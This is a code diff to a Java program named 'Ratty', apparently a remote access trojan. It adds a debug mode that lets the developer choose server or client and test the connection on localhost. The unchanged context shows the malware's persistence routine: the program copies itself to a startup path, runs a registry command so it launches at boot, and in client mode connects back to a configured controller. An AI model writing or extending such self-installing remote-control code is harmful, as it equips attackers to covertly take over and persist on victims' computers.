@@ -21,6 +21,8 @@ public final class Ratty {
 	private static int port;
 	private static boolean client;
 	
+	private static final boolean DEBUG = true;
+	
 	private static final String PORT_INPUT_MESSAGE = "Which port should the server be bind to?";
 	
 	private static final int CONNECTION_INTERVAL = 2500;
@@ -58,7 +60,7 @@ public final class Ratty {
 			final File destination = new File(STARTUP_FILE_PATH);
 			
 			FileUtils.createFile(STARTUP_FILE_PATH);
-			FileUtils.copy(source, destination);
+			FileUtils.copyFile(source, destination);
 			Runtime.getRuntime().exec(REGISTRY_COMMAND);
 		} catch (final URISyntaxException | IOException ex) {
 			ex.printStackTrace();
@@ -116,7 +118,16 @@ public final class Ratty {
 		
 		readConnectionData();
 		
-		if (client) {
+		if (DEBUG) {
+			final String[] options = {"Server", "Client"};
+			final int input = JOptionPane.showOptionDialog(null, "Server or client?", null, JOptionPane.YES_NO_OPTION, JOptionPane.QUESTION_MESSAGE, null, options, null);
+			
+			if (input == JOptionPane.YES_OPTION) {
+				startServer(23456);
+			} else if (input == JOptionPane.NO_OPTION) {
+				connectToHost("localhost", 23456);
+			}
+		} else if (client) {
 			addToStartup();
 			connectToHost(address, port);
 		} else {
